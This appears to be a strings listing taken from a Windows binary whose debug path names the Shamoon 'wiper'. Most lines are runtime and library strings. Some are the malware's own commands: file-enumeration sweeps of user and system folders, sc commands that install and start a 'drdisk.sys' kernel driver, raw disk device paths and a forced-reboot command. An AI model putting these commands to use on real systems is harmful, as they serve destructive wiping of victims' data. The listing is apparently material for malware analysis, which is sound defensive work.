[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
1430 0x000216d0 0x00422cd0 17  18   .rdata  ascii   french-luxembourg
1431 0x000216e4 0x00422ce4 15  16   .rdata  ascii   french-canadian
1432 0x000216f4 0x00422cf4 14  15   .rdata  ascii   french-belgian
1433 0x00021704 0x00422d04 11  12   .rdata  ascii   english-usa
1434 0x00021710 0x00422d10 10  11   .rdata  ascii   english-us
1435 0x0002171c 0x00422d1c 10  11   .rdata  ascii   english-uk
1436 0x00021728 0x00422d28 25  26   .rdata  ascii   english-trinidad y tobago
1437 0x00021744 0x00422d44 20  21   .rdata  ascii   english-south africa
1438 0x0002175c 0x00422d5c 10  11   .rdata  ascii   english-nz
1439 0x00021768 0x00422d68 15  16   .rdata  ascii   english-jamaica
1440 0x00021778 0x00422d78 11  12   .rdata  ascii   english-ire
1441 0x00021784 0x00422d84 17  18   .rdata  ascii   english-caribbean
1442 0x00021798 0x00422d98 11  12   .rdata  ascii   english-can
1443 0x000217a4 0x00422da4 14  15   .rdata  ascii   english-belize
1444 0x000217b4 0x00422db4 11  12   .rdata  ascii   english-aus
1445 0x000217c0 0x00422dc0 16  17   .rdata  ascii   english-american
1446 0x000217d4 0x00422dd4 13  14   .rdata  ascii   dutch-belgian
1447 0x000217e4 0x00422de4 19  20   .rdata  ascii   chinese-traditional
1448 0x000217f8 0x00422df8 17  18   .rdata  ascii   chinese-singapore
1449 0x0002180c 0x00422e0c 18  19   .rdata  ascii   chinese-simplified
1450 0x00021820 0x00422e20 16  17   .rdata  ascii   chinese-hongkong
1451 0x00021834 0x00422e34 7   8    .rdata  ascii   chinese
1452 0x00021844 0x00422e44 8   9    .rdata  ascii   canadian
1453 0x00021850 0x00422e50 7   8    .rdata  ascii   belgian
1454 0x00021858 0x00422e58 10  11   .rdata  ascii   australian
1455 0x00021864 0x00422e64 16  17   .rdata  ascii   american-english
1456 0x00021878 0x00422e78 16  17   .rdata  ascii   american english
1457 0x0002188c 0x00422e8c 8   9    .rdata  ascii   american
1458 0x00021b6b 0x0042316b 4   5    .rdata  ascii   \bOCP
1459 0x00021b74 0x00423174 17  18   .rdata  ascii   Norwegian-Nynorsk
1460 0x00021b88 0x00423188 7   16   .rdata  utf16le CONOUT$
1461 0x00021bc4 0x004231c4 7   8    .rdata  ascii   generic
1462 0x00021be8 0x004231e8 8   9    .rdata  ascii   iostream
1463 0x00021c10 0x00423210 6   7    .rdata  ascii   system
1464 0x00021c34 0x00423234 21  22   .rdata  ascii   iostream stream error
1465 0x00021cc4 0x004232c4 6   28   .rdata  utf32le rwa扲扷扡 blocks=Basic Latin,CJK Unified Ideographs
1466 0x00021d00 0x00423300 5   24   .rdata  utf32le \n!"2*
1467 0x00021d1c 0x0042331c 4   20   .rdata  utf32le \v#3+
1468 0x00021d30 0x00423330 63  64   .rdata  ascii   Visual C++ CRT: Not enough memory to complete call to strerror.
1469 0x00021d80 0x00423380 13  14   .rdata  ascii   bad exception
1470 0x00021d90 0x00423390 21  22   .rdata  ascii   Illegal byte sequence
1471 0x00021da8 0x004233a8 19  20   .rdata  ascii   Directory not empty
1472 0x00021dbc 0x004233bc 24  25   .rdata  ascii   Function not implemented
1473 0x00021dd8 0x004233d8 18  19   .rdata  ascii   No locks available
1474 0x00021dec 0x004233ec 17  18   .rdata  ascii   Filename too long
1475 0x00021e00 0x00423400 25  26   .rdata  ascii   Resource deadlock avoided
1476 0x00021e1c 0x0042341c 16  17   .rdata  ascii   Result too large
1477 0x00021e30 0x00423430 12  13   .rdata  ascii   Domain error
1478 0x00021e40 0x00423440 11  12   .rdata  ascii   Broken pipe
1479 0x00021e4c 0x0042344c 14  15   .rdata  ascii   Too many links
1480 0x00021e5c 0x0042345c 21  22   .rdata  ascii   Read-only file system
1481 0x00021e74 0x00423474 12  13   .rdata  ascii   Invalid seek
1482 0x00021e84 0x00423484 23  24   .rdata  ascii   No space left on device
1483 0x00021e9c 0x0042349c 14  15   .rdata  ascii   File too large
1484 0x00021eac 0x004234ac 35  36   .rdata  ascii   Inappropriate I/O control operation
1485 0x00021ed0 0x004234d0 19  20   .rdata  ascii   Too many open files
1486 0x00021ee4 0x004234e4 29  30   .rdata  ascii   Too many open files in system
1487 0x00021f04 0x00423504 16  17   .rdata  ascii   Invalid argument
1488 0x00021f18 0x00423518 14  15   .rdata  ascii   Is a directory
1489 0x00021f28 0x00423528 15  16   .rdata  ascii   Not a directory
1490 0x00021f38 0x00423538 14  15   .rdata  ascii   No such device
1491 0x00021f48 0x00423548 13  14   .rdata  ascii   Improper link
1492 0x00021f58 0x00423558 11  12   .rdata  ascii   File exists
1493 0x00021f64 0x00423564 15  16   .rdata  ascii   Resource device
1494 0x00021f74 0x00423574 13  14   .rdata  ascii   Unknown error
1495 0x00021f84 0x00423584 11  12   .rdata  ascii   Bad address
1496 0x00021f90 0x00423590 17  18   .rdata  ascii   Permission denied
1497 0x00021fa4 0x004235a4 16  17   .rdata  ascii   Not enough space
1498 0x00021fb8 0x004235b8 32  33   .rdata  ascii   Resource temporarily unavailable
1499 0x00021fdc 0x004235dc 18  19   .rdata  ascii   No child processes
1500 0x00021ff0 0x004235f0 19  20   .rdata  ascii   Bad file descriptor
1501 0x00022004 0x00423604 17  18   .rdata  ascii   Exec format error
1502 0x00022018 0x00423618 17  18   .rdata  ascii   Arg list too long
1503 0x0002202c 0x0042362c 25  26   .rdata  ascii   No such device or address
1504 0x00022048 0x00423648 18  19   .rdata  ascii   Input/output error
1505 0x0002205c 0x0042365c 25  26   .rdata  ascii   Interrupted function call
1506 0x00022078 0x00423678 15  16   .rdata  ascii   No such process
1507 0x00022088 0x00423688 25  26   .rdata  ascii   No such file or directory
1508 0x000220a4 0x004236a4 23  24   .rdata  ascii   Operation not permitted
1509 0x000220bc 0x004236bc 8   9    .rdata  ascii   No error
1510 0x000220cc 0x004236cc 5   6    .rdata  ascii   UTF-8
1511 0x000220d4 0x004236d4 8   9    .rdata  ascii   UTF-16LE
1512 0x000220e0 0x004236e0 7   8    .rdata  ascii   UNICODE
1513 0x000220f0 0x004236f0 5   12   .rdata  utf16le UTF-8
1514 0x000220fc 0x004236fc 8   18   .rdata  utf16le UTF-16LE
1515 0x00022110 0x00423710 7   16   .rdata  utf16le UNICODE
1516 0x00022120 0x00423720 15  16   .rdata  ascii   bad locale name
1517 0x00022130 0x00423730 20  21   .rdata  ascii   ios_base::badbit set
1518 0x00022148 0x00423748 21  22   .rdata  ascii   ios_base::failbit set
1519 0x00022160 0x00423760 20  21   .rdata  ascii   ios_base::eofbit set
1520 0x00022178 0x00423778 86  87   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul | findstr -i download 2>nul >f1.inf
1521 0x000221d0 0x004237d0 87  88   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul | findstr -i document 2>nul >>f1.inf
1522 0x00022228 0x00423828 69  70   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i download 2>nul >>f1.inf
1523 0x00022270 0x00423870 69  70   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i document 2>nul >>f1.inf
1524 0x000222b8 0x004238b8 68  69   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i picture 2>nul >>f1.inf
1525 0x00022300 0x00423900 66  67   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i video 2>nul >>f1.inf
1526 0x00022348 0x00423948 66  67   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i music 2>nul >>f1.inf
1527 0x00022390 0x00423990 86  87   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul  | findstr -i desktop 2>nul >f2.inf
1528 0x000223e8 0x004239e8 68  69   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i desktop 2>nul >>f2.inf
1529 0x00022430 0x00423a30 58  59   .rdata  ascii   dir C:\Windows\System32\Drivers /s /b /a:-D 2>nul >>f2.inf
1530 0x00022470 0x00423a70 93  94   .rdata  ascii   dir C:\Windows\System32\Config /s /b /a:-D 2>nul | findstr -v -i systemprofile 2>nul >>f2.inf
1531 0x000224d0 0x00423ad0 31  32   .rdata  ascii   dir f1.inf /s /b 2>nul >>f1.inf
1532 0x000224f0 0x00423af0 31  32   .rdata  ascii   dir f2.inf /s /b 2>nul >>f1.inf
1533 0x00022510 0x00423b10 6   7    .rdata  ascii   f1.inf
1534 0x00022518 0x00423b18 4   10   .rdata  utf16le \??\
1535 0x00022524 0x00423b24 6   7    .rdata  ascii   f2.inf
1536 0x00022530 0x00423b30 32  66   .rdata  utf16le SYSTEM\CurrentControlSet\Control
1537 0x00022574 0x00423b74 16  34   .rdata  utf16le SystemBootDevice
1538 0x00022598 0x00423b98 16  34   .rdata  utf16le \Device\Harddisk
1539 0x000225bc 0x00423bbc 6   14   .rdata  utf16le rdisk(
1540 0x000225cc 0x00423bcc 10  22   .rdata  utf16le \Partition
1541 0x000225e4 0x00423be4 10  22   .rdata  utf16le partition(
1542 0x000225fc 0x00423bfc 18  38   .rdata  utf16le FirmwareBootDevice
1543 0x00022624 0x00423c24 17  36   .rdata  utf16le \Device\Harddisk0
1544 0x00022648 0x00423c48 148 298  .rdata  utf16le 8F71FF7E2831A05D0B88FDAACFAC818E936FCAAA453404180419662BED76E9D70384F056F03ADF3C917CB8C3EE12832F7A7EC3E234BC7FBD0476CFC9F58AC1A1C248DA06E531D133A071
1545 0x00022774 0x00423d74 28  58   .rdata  utf16le \Device\Harddisk0\Partition0
1546 0x000227b0 0x00423db0 19  20   .rdata  ascii   shutdown -r -f -t 2
1547 0x000227c4 0x00423dc4 10  22   .rdata  utf16le drdisk.sys
1548 0x000227dc 0x00423ddc 22  46   .rdata  utf16le %s\System32\Drivers\%s
1549 0x0002280c 0x00423e0c 24  25   .rdata  ascii   sc stop drdisk 2>&1 >nul
1550 0x00022828 0x00423e28 26  27   .rdata  ascii   sc delete drdisk 2>&1 >nul
1551 0x00022844 0x00423e44 7   16   .rdata  utf16le ReadOne
1552 0x00022858 0x00423e58 90  91   .rdata  ascii   sc create drdisk type= kernel start= demand binpath= System32\Drivers\drdisk.sys 2>&1 >nul
1553 0x000228b4 0x00423eb4 25  26   .rdata  ascii   sc start drdisk 2>&1 >nul
1554 0x000228d0 0x00423ed0 30  31   .rdata  ascii   Wow64DisableWow64FsRedirection
1555 0x000228f0 0x00423ef0 12  26   .rdata  utf16le kernel32.dll
1556 0x0002290c 0x00423f0c 29  30   .rdata  ascii   Wow64RevertWow64FsRedirection
1557 0x0002292c 0x00423f2c 17  18   .rdata  ascii   \inf\netfb318.pnf
1558 0x00022940 0x00423f40 4   5    .rdata  ascii   %s%s
1559 0x00022948 0x00423f48 15  16   .rdata  ascii   string too long
1560 0x00022958 0x00423f58 23  24   .rdata  ascii   invalid string position
1561 0x00022970 0x00423f70 18  19   .rdata  ascii   vector<T> too long
1562 0x00022984 0x00423f84 27  28   .rdata  ascii   invalid map/set<T> iterator
1563 0x000229a0 0x00423fa0 8   9    .rdata  ascii   bad cast
1564 0x000229ac 0x00423fac 19  20   .rdata  ascii   map/set<T> too long
1565 0x00022c30 0x00424230 6   7    .rdata  ascii   RSDS\nT
1566 0x00022c48 0x00424248 46  47   .rdata  ascii   C:\Shamoon\ArabianGulf\wiper\release\wiper.pdb
1567 0x00024d46 0x00426d46 25  26   .data   ascii   InitializeCriticalSection
1568 0x00024d62 0x00426d62 9   10   .data   ascii   WriteFile
1569 0x00024d6e 0x00426d6e 11  12   .data   ascii   CloseHandle
1570 0x00024d7c 0x00426d7c 12  13   .data   ascii   CreateThread
1571 0x00024d8c 0x00426d8c 19  20   .data   ascii   WaitForSingleObject
1572 0x00024da2 0x00426da2 21  22   .data   ascii   DeleteCriticalSection
1573 0x00024dba 0x00426dba 13  14   .data   ascii   GetFileSizeEx
1574 0x00024dca 0x00426dca 14  15   .data   ascii   SetFilePointer
1575 0x00024ddc 0x00426ddc 20  21   .data   ascii   EnterCriticalSection
1576 0x00024df4 0x00426df4 13  14   .data   ascii   GetSystemTime
1577 0x00024e04 0x00426e04 13  14   .data   ascii   SetSystemTime
1578 0x00024e14 0x00426e14 20  21   .data   ascii   LeaveCriticalSection
1579 0x00024e2c 0x00426e2c 11  12   .data   ascii   CreateFileW
1580 0x00024e3a 0x00426e3a 20  21   .data   ascii   GetWindowsDirectoryW
1581 0x00024e52 0x00426e52 11  12   .data   ascii   DeleteFileW
1582 0x00024e60 0x00426e60 13  14   .data   ascii   FindResourceW
1583 0x00024e70 0x00426e70 12  13   .data   ascii   LoadResource
1584 0x00024e80 0x00426e80 12  13   .data   ascii   LockResource
1585 0x00024e90 0x00426e90 14  15   .data   ascii   SizeofResource
1586 0x00024ea2 0x00426ea2 12  13   .data   ascii   VirtualAlloc
1587 0x00024eb2 0x00426eb2 11  12   .data   ascii   VirtualFree
1588 0x00024ec0 0x00426ec0 14  15   .data   ascii   GetProcAddress
1589 0x00024ed2 0x00426ed2 16  17   .data   ascii   GetModuleHandleW
1590 0x00024ee6 0x00426ee6 20  21   .data   ascii   GetWindowsDirectoryA
1591 0x00024efe 0x00426efe 15  16   .data   ascii   DeviceIoControl
1592 0x00024f10 0x00426f10 12  13   .data   ascii   GetLastError
1593 0x00024f20 0x00426f20 12  13   .data   ascii   SetLastError
1594 0x00024f30 0x00426f30 17  18   .data   ascii   GetCurrentProcess
1595 0x00024f44 0x00426f44 12  13   .data   ascii   LoadLibraryW
1596 0x00024f54 0x00426f54 5   6    .data   ascii   Sleep
1597 0x00024f5c 0x00426f5c 18  19   .data   ascii   GetExitCodeProcess
1598 0x00024f72 0x00426f72 8   9    .data   ascii   ReadFile
1599 0x00024f7e 0x00426f7e 19  20   .data   ascii   MultiByteToWideChar
1600 0x00024f92 0x00426f92 12  13   .data   ascii   KERNEL32.dll
1601 0x00024fa2 0x00426fa2 13  14   .data   ascii   RegOpenKeyExW
1602 0x00024fb2 0x00426fb2 16  17   .data   ascii   RegQueryValueExW
1603 0x00024fc6 0x00426fc6 11  12   .data   ascii   RegCloseKey
1604 0x00024fd2 0x00426fd2 12  13   .data   ascii   ADVAPI32.dll
1605 0x00024fe2 0x00426fe2 8   9    .data   ascii   HeapFree
1606 0x00024fee 0x00426fee 20  21   .data   ascii   InterlockedDecrement
1607 0x00025006 0x00427006 9   10   .data   ascii   GetCPInfo
1608 0x00025012 0x00427012 23  24   .data   ascii   GetSystemTimeAsFileTime
1609 0x0002502c 0x0042702c 13  14   .data   ascii   EncodePointer
1610 0x0002503c 0x0042703c 13  14   .data   ascii   DecodePointer
1611 0x0002504c 0x0042704c 15  16   .data   ascii   GetCommandLineW
1612 0x0002505e 0x0042705e 18  19   .data   ascii   HeapSetInformation
1613 0x00025074 0x00427074 9   10   .data   ascii   HeapAlloc
1614 0x00025080 0x00427080 16  17   .data   ascii   TerminateProcess
1615 0x00025094 0x00427094 24  25   .data   ascii   UnhandledExceptionFilter
1616 0x000250b0 0x004270b0 27  28   .data   ascii   SetUnhandledExceptionFilter
1617 0x000250ce 0x004270ce 17  18   .data   ascii   IsDebuggerPresent
1618 0x000250e2 0x004270e2 10  11   .data   ascii   HeapCreate
1619 0x000250f0 0x004270f0 25  26   .data   ascii   IsProcessorFeaturePresent
1620 0x0002510c 0x0042710c 14  15   .data   ascii   RaiseException
1621 0x0002511e 0x0042711e 19  20   .data   ascii   WideCharToMultiByte
1622 0x00025134 0x00427134 12  13   .data   ascii   LCMapStringW
1623 0x00025144 0x00427144 14  15   .data   ascii   GetStringTypeW
1624 0x00025156 0x00427156 14  15   .data   ascii   GetLocaleInfoW
1625 0x00025168 0x00427168 20  21   .data   ascii   InterlockedIncrement
1626 0x00025180 0x00427180 8   9    .data   ascii   TlsAlloc
1627 0x0002518c 0x0042718c 11  12   .data   ascii   TlsGetValue
1628 0x0002519a 0x0042719a 11  12   .data   ascii   TlsSetValue
1629 0x000251a8 0x004271a8 7   8    .data   ascii   TlsFree
1630 0x000251b2 0x004271b2 18  19   .data   ascii   GetCurrentThreadId
1631 0x000251c8 0x004271c8 14  15   .data   ascii   SetHandleCount
1632 0x000251da 0x004271da 12  13   .data   ascii   GetStdHandle
1633 0x000251ea 0x004271ea 37  38   .data   ascii   InitializeCriticalSectionAndSpinCount
1634 0x00025212 0x00427212 11  12   .data   ascii   GetFileType
1635 0x00025220 0x00427220 15  16   .data   ascii   GetStartupInfoW
1636 0x00025232 0x00427232 8   9    .data   ascii   HeapSize
1637 0x0002523e 0x0042723e 11  12   .data   ascii   ExitProcess
1638 0x0002524c 0x0042724c 18  19   .data   ascii   GetFileAttributesA
1639 0x00025262 0x00427262 12  13   .data   ascii   GetConsoleCP
1640 0x00025272 0x00427272 14  15   .data   ascii   GetConsoleMode
1641 0x00025284 0x00427284 16  17   .data   ascii   FlushFileBuffers
1642 0x00025298 0x00427298 18  19   .data   ascii   GetModuleFileNameW
1643 0x000252ae 0x004272ae 23  24   .data   ascii   FreeEnvironmentStringsW
1644 0x000252c8 0x004272c8 22  23   .data   ascii   GetEnvironmentStringsW
1645 0x000252e2 0x004272e2 23  24   .data   ascii   QueryPerformanceCounter
1646 0x000252fc 0x004272fc 12  13   .data   ascii   GetTickCount
1647 0x0002530c 0x0042730c 19  20   .data   ascii   GetCurrentProcessId
1648 0x00025322 0x00427322 6   7    .data   ascii   GetACP
1649 0x0002532c 0x0042732c 8   9    .data   ascii   GetOEMCP
1650 0x00025338 0x00427338 15  16   .data   ascii   IsValidCodePage
1651 0x0002534a 0x0042734a 9   10   .data   ascii   RtlUnwind
1652 0x00025356 0x00427356 11  12   .data   ascii   HeapReAlloc
1653 0x00025364 0x00427364 19  20   .data   ascii   InterlockedExchange
1654 0x0002537a 0x0042737a 14  15   .data   ascii   CreateProcessA
1655 0x0002538c 0x0042738c 13  14   .data   ascii   WriteConsoleW
1656 0x0002539c 0x0042739c 12  13   .data   ascii   SetStdHandle
1657 0x000253ac 0x004273ac 18  19   .data   ascii   GetUserDefaultLCID
1658 0x000253c2 0x004273c2 14  15   .data   ascii   GetLocaleInfoA
1659 0x000253d4 0x004273d4 18  19   .data   ascii   EnumSystemLocalesA
1660 0x000253ea 0x004273ea 13  14   .data   ascii   IsValidLocale
1661 0x000253fa 0x004273fa 14  15   .data   ascii   CompareStringW
1662 0x0002540c 0x0042740c 23  24   .data   ascii   SetEnvironmentVariableA
1663 0x00025426 0x00427426 26  27   .data   ascii   InterlockedCompareExchange
1664 0x00025444 0x00427444 11  12   .data   ascii   CreateFileA
1665 0x00025452 0x00427452 12  13   .data   ascii   SetEndOfFile
1666 0x00025462 0x00427462 14  15   .data   ascii   GetProcessHeap
1667 0x00026018 0x0042a418 15  16   .rsrc   ascii   .?AVtype_info@@
1668 0x000262ec 0x0042a6ec 12  52   .rsrc   utf32le \t\a\f\b\f\t\f\n\a\v\b\f
1669 0x00026370 0x0042a770 5   24   .rsrc   utf32le R\rS\rW
1670 0x00026388 0x0042a788 7   32   .rsrc   utf32le Y\vl\rm p
1671 0x000263fc 0x0042a7fc 4   20   .rsrc   utf32le \v§\r· blocks=Basic Latin,Latin-1 Supplement
1672 0x00026896 0x0042ac96 26  27   .rsrc   ascii                             
1673 0x00026976 0x0042ad76 26  27   .rsrc   ascii   abcdefghijklmnopqrstuvwxyz
1674 0x00026996 0x0042ad96 26  27   .rsrc   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1675 0x00026a9a 0x0042ae9a 26  27   .rsrc   ascii                             
1676 0x00026b18 0x0042af18 24  25   .rsrc   ascii                           
1677 0x00026b31 0x0042af31 8   9    .rsrc   ascii           
1678 0x00026b81 0x0042af81 26  27   .rsrc   ascii   abcdefghijklmnopqrstuvwxyz
1679 0x00026ba1 0x0042afa1 26  27   .rsrc   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1680 0x00026f2c 0x0042b32c 24  25   .rsrc   ascii   .?AV_Locimp@locale@std@@
1681 0x00026f50 0x0042b350 24  25   .rsrc   ascii   .?AVerror_category@std@@
1682 0x00026f74 0x0042b374 33  34   .rsrc   ascii   .?AV_Generic_error_category@std@@
1683 0x00026fa0 0x0042b3a0 34  35   .rsrc   ascii   .?AV_Iostream_error_category@std@@
1684 0x00026fcc 0x0042b3cc 32  33   .rsrc   ascii   .?AV_System_error_category@std@@
1685 0x00027018 0x0042b418 21  22   .rsrc   ascii   .?AVlogic_error@std@@
1686 0x00027038 0x0042b438 22  23   .rsrc   ascii   .?AVlength_error@std@@
1687 0x00027058 0x0042b458 22  23   .rsrc   ascii   .?AVout_of_range@std@@
1688 0x00027078 0x0042b478 90  91   .rsrc   ascii   Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.
1689 0x000270dc 0x0042b4dc 23  24   .rsrc   ascii   .?AVbad_exception@std@@
1690 0x000271bc 0x0042b5bc 23  24   .rsrc   ascii   .?AV?$codecvt@DDH@std@@
1691 0x000271dc 0x0042b5dc 20  21   .rsrc   ascii   .?AV?$ctype@_W@std@@
1692 0x000271fc 0x0042b5fc 19  20   .rsrc   ascii   .?AV?$ctype@D@std@@
1693 0x00027218 0x0042b618 20  21   .rsrc   ascii   .?AUctype_base@std@@
1694 0x00027238 0x0042b638 24  25   .rsrc   ascii   .?AV?$codecvt@_WDH@std@@
1695 0x0002725c 0x0042b65c 22  23   .rsrc   ascii   .?AVcodecvt_base@std@@
1696 0x0002727c 0x0042b67c 22  23   .rsrc   ascii   .?AVfacet@locale@std@@
1697 0x0002729c 0x0042b69c 51  52   .rsrc   ascii   .?AV?$basic_fstream@_WU?$char_traits@_W@std@@@std@@
1698 0x000272d8 0x0042b6d8 51  52   .rsrc   ascii   .?AV?$basic_filebuf@_WU?$char_traits@_W@std@@@std@@
1699 0x00027314 0x0042b714 52  53   .rsrc   ascii   .?AV?$basic_iostream@_WU?$char_traits@_W@std@@@std@@
1700 0x00027354 0x0042b754 51  52   .rsrc   ascii   .?AV?$basic_ostream@_WU?$char_traits@_W@std@@@std@@
1701 0x00027390 0x0042b790 51  52   .rsrc   ascii   .?AV?$basic_istream@_WU?$char_traits@_W@std@@@std@@
1702 0x000273cc 0x0042b7cc 53  54   .rsrc   ascii   .?AV?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@
1703 0x0002740c 0x0042b80c 47  48   .rsrc   ascii   .?AV?$basic_ios@_WU?$char_traits@_W@std@@@std@@
1704 0x00027444 0x0042b844 49  50   .rsrc   ascii   .?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@
1705 0x00027480 0x0042b880 49  50   .rsrc   ascii   .?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
1706 0x000274bc 0x0042b8bc 50  51   .rsrc   ascii   .?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@
1707 0x000274f8 0x0042b8f8 49  50   .rsrc   ascii   .?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
1708 0x00027534 0x0042b934 49  50   .rsrc   ascii   .?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
1709 0x00027570 0x0042b970 51  52   .rsrc   ascii   .?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
1710 0x000275ac 0x0042b9ac 45  46   .rsrc   ascii   .?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
1711 0x000275e4 0x0042b9e4 19  20   .rsrc   ascii   .?AV?$_Iosb@H@std@@
1712 0x00027600 0x0042ba00 18  19   .rsrc   ascii   .?AVios_base@std@@
1713 0x00027626 0x0042ba26 4   5    .rsrc   ascii   JFIF
1714 0x00027649 0x0042ba49 5   6    .rsrc   ascii   \n\n\t\t\n
1715 0x00027665 0x0042ba65 9   10   .rsrc   ascii    , #&')*)
1716 0x00027670 0x0042ba70 9   10   .rsrc   ascii   -0-(0%()(
1717 0x0002767e 0x0042ba7e 6   7    .rsrc   ascii   \a\a\a\n\b\n
1718 0x0002768c 0x0042ba8c 50  51   .rsrc   ascii   ((((((((((((((((((((((((((((((((((((((((((((((((((
1719 0x00027711 0x0042bb11 5   6    .rsrc   ascii   "Qa\aq
1720 0x0002782d 0x0042bc2d 7   8    .rsrc   ascii   4;]KT[+
1721 0x0002784d 0x0042bc4d 6   8    .rsrc   utf8    z&xCܔ] blocks=Basic Latin,Syriac
1722 0x0002789e 0x0042bc9e 5   7    .rsrc   utf8    \f\nwBݾ blocks=Basic Latin,Arabic Supplement
1723 0x000278b1 0x0042bcb1 4   7    .rsrc   utf8    [z㏆~ blocks=Basic Latin,CJK Compatibility
1724 0x00027958 0x0042bd58 5   6    .rsrc   ascii   c$yoU
1725 0x00027995 0x0042bd95 5   6    .rsrc   ascii   N*ZL+
1726 0x000279a6 0x0042bda6 4   6    .rsrc   utf8    THг1 blocks=Basic Latin,Cyrillic
1727 0x000279ad 0x0042bdad 5   6    .rsrc   ascii   nM\v8@
1728 0x000279d7 0x0042bdd7 4   5    .rsrc   ascii   \v8\2
1729 0x000279ff 0x0042bdff 7   10   .rsrc   utf8    9Ͳ$N{v· blocks=Basic Latin,Greek and Coptic,Latin-1 Supplement
1730 0x00027a15 0x0042be15 4   5    .rsrc   ascii   hV:}
1731 0x00027a3c 0x0042be3c 23  24   .rsrc   ascii   .?AVruntime_error@std@@
1732 0x00027a5c 0x0042be5c 19  20   .rsrc   ascii   .?AVexception@std@@
1733 0x00027a78 0x0042be78 26  27   .rsrc   ascii   .?AVfailure@ios_base@std@@
1734 0x00027a9c 0x0042be9c 22  23   .rsrc   ascii   .?AVsystem_error@std@@
1735 0x00027abc 0x0042bebc 18  19   .rsrc   ascii   .?AVbad_cast@std@@
1736 0x00027ad8 0x0042bed8 19  20   .rsrc   ascii   .?AVbad_alloc@std@@
1737 0x00028620 0x0042ca20 40  82   .rsrc   utf16le C:\Users\byteatlas\Desktop\vjLUHZzc5.exe
1738 0x0002a0a0 0x0042e4a0 8   17   .rsrc   utf16le \aREADONE
1739 0x0002a0f5 0x0042e4f5 4   5    .rsrc   ascii   \e[=4
1740 0x0002a5f0 0x0042e9f0 4   5    .rsrc   ascii   BPGx
1741 0x0002a600 0x0042ea00 5   6    .rsrc   ascii   NDD{S
1742 0x0002a650 0x0042ea50 4   5    .rsrc   ascii   8%Cp
1743 0x0002a6d7 0x0042ead7 4   5    .rsrc   ascii   \a`Es
1744 0x0002a73f 0x0042eb3f 4   5    .rsrc   ascii   <}_T
1745 0x0002a77b 0x0042eb7b 5   6    .rsrc   ascii   }P_6S
1746 0x0002a809 0x0042ec09 4   7    .rsrc   utf8    ⢄J"\e blocks=Braille Patterns,Basic Latin
1747 0x0002a812 0x0042ec12 6   7    .rsrc   ascii   \t{Y)Fu
1748 0x0002a83f 0x0042ec3f 4   6    .rsrc   utf8    (`aҍ blocks=Basic Latin,Cyrillic
1749 0x0002a8ca 0x0042ecca 5   7    .rsrc   utf8    R{P[ٸ blocks=Basic Latin,Arabic
1750 0x0002a8e0 0x0042ece0 4   5    .rsrc   ascii   a%:P
1751 0x0002a94c 0x0042ed4c 4   6    .rsrc   utf8    .]$ј blocks=Basic Latin,Cyrillic
1752 0x0002a9fd 0x0042edfd 10  11   .rsrc   ascii   na0&ta9&}a
1753 0x0002aa23 0x0042ee23 4   5    .rsrc   ascii   3@$>
1754 0x0002aa74 0x0042ee74 4   5    .rsrc   ascii   `S:\a
1755 0x0002acfc 0x0042f0fc 4   5    .rsrc   ascii   TkYw
1756 0x0002b129 0x0042f529 4   5    .rsrc   ascii   &\{U
1757 0x0002b195 0x0042f595 4   5    .rsrc   ascii   DQs5
1758 0x0002b1cb 0x0042f5cb 4   5    .rsrc   ascii    s$T
